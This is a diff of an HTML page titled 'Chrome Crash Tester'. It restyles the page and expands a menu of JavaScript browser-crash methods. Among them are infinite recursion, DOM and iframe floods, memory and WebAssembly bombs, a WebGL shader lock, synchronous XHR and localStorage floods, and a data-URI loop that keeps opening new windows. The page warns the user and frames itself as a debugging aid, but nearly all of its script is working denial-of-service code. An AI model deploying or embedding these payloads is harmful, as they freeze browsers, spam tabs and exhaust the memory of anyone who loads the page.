@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Crash Tester</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Chrome Crash Tester</title>
   <style>
     :root {
       --bg: #0e0f11;
@@ -12,220 +12,114 @@
       --card: #1b1d22;
       --border: #2c2f36;
     }
-
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-
+    * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
       background: var(--bg);
       color: var(--fg);
       font-family: 'Segoe UI', Roboto, sans-serif;
-      min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      padding: 2rem;
+      min-height: 100vh;
+      padding: 1rem;
     }
-
     .container {
       background: var(--card);
-      padding: 2rem 3rem;
-      border-radius: 16px;
-      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+      padding: 2rem;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.3);
       text-align: center;
       max-width: 600px;
       width: 100%;
       border: 1px solid var(--border);
-      position: relative;
     }
-
     h1 {
-      font-size: 2rem;
+      font-size: 1.75rem;
       margin-bottom: 1rem;
       color: var(--accent);
     }
-
     .warning {
       color: var(--accent);
       font-weight: bold;
       margin-bottom: 1rem;
-      font-size: 1.1rem;
-    }
-
-    p {
-      font-size: 0.95rem;
-      color: #ccc;
-      margin-bottom: 2rem;
-    }
-
-    select, button {
       font-size: 1rem;
+    }
+    p {
+      color: #ccc;
+      margin-bottom: 1.5rem;
+      font-size: 0.9rem;
+    }
+    select, button {
+      font-size: 0.95rem;
       padding: 0.75rem 1.25rem;
-      border-radius: 12px;
+      border-radius: 8px;
       border: 1px solid var(--border);
       background: #2a2d34;
       color: var(--fg);
-      appearance: none;
-      transition: background 0.2s, transform 0.2s;
+      transition: background 0.2s, transform 0.1s;
     }
-
-    select:hover, button:hover {
-      background: #33363d;
-      transform: scale(1.02);
-    }
-
+    select:hover, button:hover { background: #33363d; }
     button {
-      margin-top: 1.5rem;
+      margin-top: 1rem;
       background: var(--accent);
       color: white;
       border: none;
-      font-weight: bold;
-      letter-spacing: 1px;
+      cursor: pointer;
     }
-
-    button:active {
-      transform: scale(0.98);
-    }
-
-    .floating-emoji {
-      position: absolute;
-      font-size: 3rem;
-      top: -20px;
-      right: -20px;
-      animation: float 2s infinite ease-in-out;
-      user-select: none;
-      pointer-events: none;
-    }
-
-    @keyframes float {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-10px); }
-    }
+    button:active { transform: scale(0.98); }
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="floating-emoji"></div>
     <h1>Chrome Crash Tester</h1>
-    <div class="warning">This will crash your browser — even Chrome itself.</div>
-    <p>Select a method below. Use only for debugging or educational testing. You’ve been warned.</p>
-
+    <div class="warning">WARNING: This will crash your browser, even Chrome itself.</div>
+    <p>Select a crash method below. Use only for debugging or educational purposes. You have been warned.</p>
     <select id="method">
       <option value="stack">Infinite Recursion (Stack Overflow)</option>
       <option value="dom">DOM Bomb (Element Explosion)</option>
       <option value="canvas">Canvas Flood (Memory Leak)</option>
       <option value="gpu">WebGL Shader Lock (GPU crash)</option>
-      <option value="blob">Blob URI Spawn Loop (Chrome-wide tab spam)</option>
+      <option value="blob">Blob URI Spawn Loop (All Tabs spam)</option>
       <option value="worker">Web Worker Memory Bomb</option>
       <option value="iframe">Infinite Iframe Nesting</option>
       <option value="alloc">Memory Allocation Loop (RAM Flood)</option>
       <option value="raf">requestAnimationFrame CPU Lock</option>
-      <option value="sequence">Full Sequence (All Methods In Order)</option>
+      <option value="xhr">XHR Flood (Synchronous)</option>
+      <option value="wasm">WebAssembly Memory Bomb</option>
+      <option value="audio">AudioContext Leak</option>
+      <option value="storage">LocalStorage Flood</option>
+      <option value="sequence">Full Sequence (All Methods)</option>
     </select>
-
     <br>
-    <button onclick="startCrash()">CRASH</button>
+    <button id="crashBtn">Crash</button>
   </div>
-
   <script>
-    function startCrash() {
-      const method = document.getElementById("method").value;
-      alert("Crash will begin in 3 seconds.\nClose other tabs and save your work.");
-
+    document.getElementById('crashBtn').addEventListener('click', () => {
+      const method = document.getElementById('method').value;
+      alert('Crash will begin in 2 seconds. Close other tabs and save your work.');
       setTimeout(() => {
-        const crash = {
-          stack: () => (function recurse() { recurse(); })(),
-
-          dom: () => {
-            while (true) {
-              const el = document.createElement("div");
-              document.body.appendChild(el);
-            }
-          },
-
-          canvas: () => {
-            const c = document.createElement("canvas");
-            c.width = c.height = 10000;
-            document.body.appendChild(c);
-            const ctx = c.getContext("2d");
-            while (true) ctx.fillRect(Math.random()*10000, Math.random()*10000, 100, 100);
-          },
-
-          gpu: () => {
-            const canvas = document.createElement('canvas');
-            document.body.appendChild(canvas);
-            const gl = canvas.getContext('webgl');
-            const shaderSource = 'void main() { for(int i=0;i<9999999;i++){} gl_FragColor=vec4(1.0); }';
-            const shader = gl.createShader(gl.FRAGMENT_SHADER);
-            gl.shaderSource(shader, shaderSource);
-            gl.compileShader(shader);
-            const prog = gl.createProgram();
-            gl.attachShader(prog, shader);
-            gl.linkProgram(prog);
-            gl.useProgram(prog);
-            gl.drawArrays(gl.POINTS, 0, 1);
-          },
-
-          blob: () => {
-            const payload = 'data:text/html;base64,' + btoa('<script>location="data:text/html;base64,' + btoa('<script>location=location</script>') + '"</script>');
-            while (true) window.open(payload, '_blank');
-          },
-
-          worker: () => {
-            const blob = new Blob([`onmessage = function () {
-              let a = [];
-              while (true) a.push(new Array(1000000).fill('*'));
-            }`]);
-            const url = URL.createObjectURL(blob);
-            while (true) {
-              const w = new Worker(url);
-              w.postMessage('go');
-            }
-          },
-
-          iframe: () => {
-            const container = document.createElement('div');
-            document.body.appendChild(container);
-            let src = 'about:blank';
-            for (let i = 0; i < 10000; i++) {
-              const iframe = document.createElement('iframe');
-              iframe.src = src;
-              container.appendChild(iframe);
-            }
-          },
-
-          alloc: () => {
-            let a = [];
-            while (true) a.push(new Array(1000000).fill('*'));
-          },
-
-          raf: () => {
-            function spam() {
-              for (let i = 0; i < 100000; i++) Math.sqrt(Math.random());
-              requestAnimationFrame(spam);
-            }
-            requestAnimationFrame(spam);
-          },
-
-          sequence: () => {
-            crash.stack();
-            crash.dom();
-            crash.canvas();
-            crash.gpu();
-            crash.blob();
-            crash.worker();
-            crash.iframe();
-            crash.alloc();
-            crash.raf();
-          }
+        const crash = {};
+        crash.stack = () => { (function recurse(){ recurse(); })(); };
+        crash.dom = () => { while(true){ document.body.appendChild(document.createElement('div')); } };
+        crash.canvas = () => { const c=document.createElement('canvas'); c.width=c.height=10000; document.body.appendChild(c); const ctx=c.getContext('2d'); while(true){ ctx.fillRect(Math.random()*10000, Math.random()*10000, 100,100); } };
+        crash.gpu = () => { const c=document.createElement('canvas'); document.body.appendChild(c); const gl=c.getContext('webgl'); const src='void main(){for(int i=0;i<9999999;i++);}'; const s=gl.createShader(gl.FRAGMENT_SHADER); gl.shaderSource(s,src); gl.compileShader(s); const p=gl.createProgram(); gl.attachShader(p,s); gl.linkProgram(p); gl.useProgram(p); gl.drawArrays(gl.POINTS,0,1); };
+        crash.blob = () => { const payload='data:text/html;base64,'+btoa('<script>location="data:text/html;base64,'+btoa('<script>location=location<\/script>')+'"<\/script>'); while(true){ window.open(payload); } };
+        crash.worker = () => { const blob=new Blob(['onmessage=function(){while(true)Array(1e6).fill("*");}']); const url=URL.createObjectURL(blob); while(true){ const w=new Worker(url); w.postMessage('go'); } };
+        crash.iframe = () => { for(let i=0;i<5000;i++){ const f=document.createElement('iframe'); f.src='about:blank'; document.body.appendChild(f);} };
+        crash.alloc = () => { const arr=[]; while(true){ arr.push(new Array(1e6).fill('*')); } };
+        crash.raf = () => { function spin(){ for(let i=0;i<100000;i++)Math.sqrt(Math.random()); requestAnimationFrame(spin);} requestAnimationFrame(spin); };
+        crash.xhr = () => { while(true){ try{ const r=new XMLHttpRequest(); r.open('GET','/nonexistent',false); r.send(); } catch(e){} } };
+        crash.wasm = () => {
+          const buf=new WebAssembly.Memory({initial:256,maximum:256});
+          WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0,1,4,1,96,0,0,3,2,1,0,5,3,1,0,1,7,7,1,3,103,101,116,0,0,10,9,1,7,0,65,0,11]),{env:{memory:buf}})
+            .then(m=>{ while(true){ buf.grow(1); } });
         };
-
+        crash.audio = () => { function leak(){ new AudioContext(); leak(); } leak(); };
+        crash.storage = () => { while(true){ localStorage.setItem('crash', new Array(1e6).join('*')); } };
+        crash.sequence = () => { for(const key in crash){ if(key !== 'sequence') crash[key](); } };
         crash[method]();
-      }, 3000);
-    }
+      }, 2000);
+    });
   </script>
 </body>
 </html>
